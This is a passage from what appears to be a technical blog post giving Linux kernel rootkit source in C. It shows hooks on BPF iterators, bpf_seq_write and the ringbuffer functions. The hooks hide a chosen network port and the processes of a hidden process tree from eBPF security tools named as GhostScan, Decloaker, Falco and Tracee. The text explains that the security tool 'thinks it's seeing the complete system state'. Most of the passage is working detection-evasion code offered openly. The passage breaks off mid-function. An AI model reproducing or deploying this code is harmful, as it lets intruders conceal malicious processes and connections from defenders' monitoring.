</span></span><span class="line"><span class="cl">    <span class="n">__be32</span> <span class="n">saddr</span><span class="p">,</span> <span class="n">daddr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">sk</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="nf">init_hidden_ip</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">sk</span><span class="o">-&gt;</span><span class="n">skc_family</span> <span class="o">==</span> <span class="n">AF_INET</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">sport</span> <span class="o">=</span> <span class="n">sk</span><span class="o">-&gt;</span><span class="n">skc_num</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">dport</span> <span class="o">=</span> <span class="n">sk</span><span class="o">-&gt;</span><span class="n">skc_dport</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">saddr</span> <span class="o">=</span> <span class="n">sk</span><span class="o">-&gt;</span><span class="n">skc_rcv_saddr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">daddr</span> <span class="o">=</span> <span class="n">sk</span><span class="o">-&gt;</span><span class="n">skc_daddr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">sport</span> <span class="o">==</span> <span class="n">HIDDEN_PORT</span> <span class="o">||</span> <span class="nf">ntohs</span><span class="p">(</span><span class="n">dport</span><span class="p">)</span> <span class="o">==</span> <span class="n">HIDDEN_PORT</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">saddr</span> <span class="o">==</span> <span class="n">hidden_ip_cached</span> <span class="o">||</span> <span class="n">daddr</span> <span class="o">==</span> <span class="n">hidden_ip_cached</span> <span class="o">||</span>
</span></span><span class="line"><span class="cl">                <span class="n">saddr</span> <span class="o">==</span> <span class="nf">htonl</span><span class="p">(</span><span class="n">INADDR_ANY</span><span class="p">)</span> <span class="o">||</span> <span class="n">daddr</span> <span class="o">==</span> <span class="nf">htonl</span><span class="p">(</span><span class="n">INADDR_ANY</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">sk</span><span class="o">-&gt;</span><span class="n">skc_family</span> <span class="o">==</span> <span class="n">AF_INET6</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">sport</span> <span class="o">=</span> <span class="n">sk</span><span class="o">-&gt;</span><span class="n">skc_num</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">sport</span> <span class="o">==</span> <span class="n">HIDDEN_PORT</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><h2 id="intercepting-bpf-iterators">Intercepting BPF Iterators<a hidden class="anchor" aria-hidden="true" href="#intercepting-bpf-iterators">#</a></h2>
<p>BPF iterators allow tools like GhostScan and Decloaker to enumerate kernel objects. By hooking the iterator execution, we can selectively filter results.</p>
<p><strong>Iterator Context Structures:</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">bpf_iter_ctx_tcp</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">bpf_iter_meta</span> <span class="o">*</span><span class="n">meta</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">sock_common</span> <span class="o">*</span><span class="n">sk_common</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uid_t</span> <span class="n">uid</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">bpf_iter_ctx_udp</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">bpf_iter_meta</span> <span class="o">*</span><span class="n">meta</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">udp_sock</span> <span class="o">*</span><span class="n">udp_sk</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uid_t</span> <span class="n">uid</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">bucket</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">bpf_iter_ctx_task</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">bpf_iter_meta</span> <span class="o">*</span><span class="n">meta</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">task_struct</span> <span class="o">*</span><span class="n">task</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span></code></pre></div><p><strong>Hooking bpf_iter_run_prog:</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">static</span> <span class="n">notrace</span> <span class="kt">int</span> <span class="nf">hook_bpf_iter_run_prog</span><span class="p">(</span><span class="k">struct</span> <span class="n">bpf_prog</span> <span class="o">*</span><span class="n">prog</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">ctx</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">bpf_iter_ctx_tcp</span> <span class="o">*</span><span class="n">tcp_ctx</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">bpf_iter_ctx_udp</span> <span class="o">*</span><span class="n">udp_ctx</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">bpf_iter_ctx_task</span> <span class="o">*</span><span class="n">task_ctx</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">sock_common</span> <span class="o">*</span><span class="n">sk</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">udp_sock</span> <span class="o">*</span><span class="n">udp_sk</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">task_struct</span> <span class="o">*</span><span class="n">task</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">orig_bpf_iter_run_prog</span> <span class="o">||</span> <span class="o">!</span><span class="n">ctx</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">goto</span> <span class="n">passthrough</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1">// Check if this is a TCP socket iterator
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">tcp_ctx</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">bpf_iter_ctx_tcp</span> <span class="o">*</span><span class="p">)</span><span class="n">ctx</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">tcp_ctx</span> <span class="o">&amp;&amp;</span> <span class="n">tcp_ctx</span><span class="o">-&gt;</span><span class="n">sk_common</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">sk</span> <span class="o">=</span> <span class="n">tcp_ctx</span><span class="o">-&gt;</span><span class="n">sk_common</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">sk</span> <span class="o">&gt;</span> <span class="n">PAGE_SIZE</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nf">should_hide_socket_port</span><span class="p">(</span><span class="n">sk</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>  <span class="c1">// Skip this socket
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1">// Check if this is a UDP socket iterator
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">udp_ctx</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">bpf_iter_ctx_udp</span> <span class="o">*</span><span class="p">)</span><span class="n">ctx</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">udp_ctx</span> <span class="o">&amp;&amp;</span> <span class="n">udp_ctx</span><span class="o">-&gt;</span><span class="n">udp_sk</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">udp_sk</span> <span class="o">=</span> <span class="n">udp_ctx</span><span class="o">-&gt;</span><span class="n">udp_sk</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">udp_sk</span> <span class="o">&gt;</span> <span class="n">PAGE_SIZE</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">sk</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">udp_sk</span><span class="o">-&gt;</span><span class="n">inet</span><span class="p">.</span><span class="n">sk</span><span class="p">.</span><span class="n">__sk_common</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nf">should_hide_socket_port</span><span class="p">(</span><span class="n">sk</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>  <span class="c1">// Skip this socket
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1">// Check if this is a task iterator
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">task_ctx</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">bpf_iter_ctx_task</span> <span class="o">*</span><span class="p">)</span><span class="n">ctx</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">task_ctx</span> <span class="o">&amp;&amp;</span> <span class="n">task_ctx</span><span class="o">-&gt;</span><span class="n">task</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">task</span> <span class="o">=</span> <span class="n">task_ctx</span><span class="o">-&gt;</span><span class="n">task</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">task</span> <span class="o">&gt;</span> <span class="n">PAGE_SIZE</span> <span class="o">&amp;&amp;</span> <span class="n">task</span><span class="o">-&gt;</span><span class="n">pid</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nf">is_child_of_hidden_process</span><span class="p">(</span><span class="n">task</span><span class="o">-&gt;</span><span class="n">pid</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>  <span class="c1">// Skip this task
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="nl">passthrough</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nf">orig_bpf_iter_run_prog</span><span class="p">(</span><span class="n">prog</span><span class="p">,</span> <span class="n">ctx</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p><strong>How This Defeats Detection:</strong></p>
<p>When GhostScan or Decloaker use BPF iterators to enumerate processes or network connections, our hook intercepts each iteration. For hidden PIDs or network connections, we return 0 (skip), preventing the eBPF program from ever seeing that object. The security tool thinks it&rsquo;s seeing the complete system state, but we&rsquo;ve selectively filtered the view.</p>
<p><strong>Hooking seq_file Output:</strong></p>
<p>Iterators also use <code>bpf_seq_write()</code> and <code>bpf_seq_printf()</code> to format output. We hook these too:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">static</span> <span class="n">notrace</span> <span class="kt">int</span> <span class="nf">hook_bpf_seq_write</span><span class="p">(</span><span class="k">struct</span> <span class="n">seq_file</span> <span class="o">*</span><span class="n">seq</span><span class="p">,</span> <span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="n">u32</span> <span class="n">len</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="n">u32</span> <span class="o">*</span><span class="n">pid_data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">orig_bpf_seq_write</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="n">ENOSYS</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">data</span> <span class="o">||</span> <span class="n">len</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">u32</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">goto</span> <span class="n">passthrough</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1">// Scan the data for PIDs
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">pid_data</span> <span class="o">=</span> <span class="p">(</span><span class="k">const</span> <span class="n">u32</span> <span class="o">*</span><span class="p">)</span><span class="n">data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="p">(</span><span class="n">len</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">u32</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">16</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">u32</span> <span class="n">potential_pid</span> <span class="o">=</span> <span class="n">pid_data</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">potential_pid</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">potential_pid</span> <span class="o">&lt;</span> <span class="mi">4194304</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nf">is_child_of_hidden_process</span><span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="n">potential_pid</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>  <span class="c1">// Block this write
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="nl">passthrough</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nf">orig_bpf_seq_write</span><span class="p">(</span><span class="n">seq</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">len</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><h2 id="filtering-ringbuffer-events">Filtering Ringbuffer Events<a hidden class="anchor" aria-hidden="true" href="#filtering-ringbuffer-events">#</a></h2>
<p>Falco and Tracee heavily rely on ringbuffers for event streaming. By hooking ringbuffer operations, we can prevent events related to our processes from reaching userspace.</p>
<p><strong>Falco Event Structure:</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">falco_event_hdr</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">u64</span> <span class="n">ts</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">u64</span> <span class="n">tid</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">u32</span> <span class="n">len</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">u16</span> <span class="n">type</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">u32</span> <span class="n">nparams</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="nf">__attribute__</span><span class="p">((</span><span class="n">packed</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="n">notrace</span> <span class="kt">bool</span> <span class="nf">is_falco_event</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="n">u64</span> <span class="n">size</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">falco_event_hdr</span> <span class="o">*</span><span class="n">hdr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">data</span> <span class="o">||</span> <span class="n">size</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">falco_event_hdr</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="n">hdr</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">falco_event_hdr</span> <span class="o">*</span><span class="p">)</span><span class="n">data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1">// Validate event structure
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="n">hdr</span><span class="o">-&gt;</span><span class="n">type</span> <span class="o">&gt;=</span> <span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="n">hdr</span><span class="o">-&gt;</span><span class="n">type</span> <span class="o">&lt;=</span> <span class="mi">400</span> <span class="o">&amp;&amp;</span>
</span></span><span class="line"><span class="cl">        <span class="n">hdr</span><span class="o">-&gt;</span><span class="n">len</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">hdr</span><span class="o">-&gt;</span><span class="n">len</span> <span class="o">&lt;</span> <span class="mi">65536</span> <span class="o">&amp;&amp;</span>
</span></span><span class="line"><span class="cl">        <span class="n">hdr</span><span class="o">-&gt;</span><span class="n">nparams</span> <span class="o">&lt;</span> <span class="mi">20</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p><strong>Hooking bpf_ringbuf_output:</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">static</span> <span class="n">notrace</span> <span class="kt">long</span> <span class="nf">hook_bpf_ringbuf_output</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">ringbuf</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="n">u64</span> <span class="n">size</span><span class="p">,</span> <span class="n">u64</span> <span class="n">flags</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">falco_event_hdr</span> <span class="o">*</span><span class="n">hdr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">pid</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">orig_bpf_ringbuf_output</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="n">ENOSYS</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">data</span> <span class="o">||</span> <span class="o">!</span><span class="n">ringbuf</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">goto</span> <span class="n">passthrough</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1">// Check if this looks like a Falco event
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">is_falco_event</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">size</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">goto</span> <span class="n">passthrough</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="n">hdr</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">falco_event_hdr</span> <span class="o">*</span><span class="p">)</span><span class="n">data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">pid</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)(</span><span class="n">hdr</span><span class="o">-&gt;</span><span class="n">tid</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1">// If this event is from a hidden process, drop it
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="nf">is_child_of_hidden_process</span><span class="p">(</span><span class="n">pid</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="nl">passthrough</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nf">orig_bpf_ringbuf_output</span><span class="p">(</span><span class="n">ringbuf</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">flags</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p><strong>Hooking bpf_ringbuf_reserve:</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">static</span> <span class="n">notrace</span> <span class="kt">void</span> <span class="o">*</span><span class="nf">hook_bpf_ringbuf_reserve</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">ringbuf</span><span class="p">,</span> <span class="n">u64</span> <span class="n">size</span><span class="p">,</span> <span class="n">u64</span> <span class="n">flags</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">pid_t</span> <span class="n">pid</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">orig_bpf_ringbuf_reserve</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="n">pid</span> <span class="o">=</span> <span class="n">current</span><span class="o">-&gt;</span><span class="n">tgid</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1">// Deny ringbuffer allocation for hidden processes
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="nf">is_child_of_hidden_process</span><span class="p">(</span><span class="n">pid</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nf">orig_bpf_ringbuf_reserve</span><span class="p">(</span><span class="n">ringbuf</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">flags</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p><strong>Hooking bpf_ringbuf_submit:</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">static</span> <span class="n">notrace</span> <span class="kt">void</span> <span class="nf">hook_bpf_ringbuf_submit</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="n">u64</span> <span class="n">flags</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">falco_event_hdr</span> <span class="o">*</span><span class="n">hdr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">pid</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">orig_bpf_ringbuf_submit</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">goto</span> <span class="n">passthrough</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">is_falco_event</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">goto</span> <span class="n">passthrough</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="n">hdr</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">falco_event_hdr</span> <span class="o">*</span><span class="p">)</span><span class="n">data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">pid</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)(</span><span class="n">hdr</span><span class="o">-&gt;</span><span class="n">tid</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1">// Drop submission for hidden processes
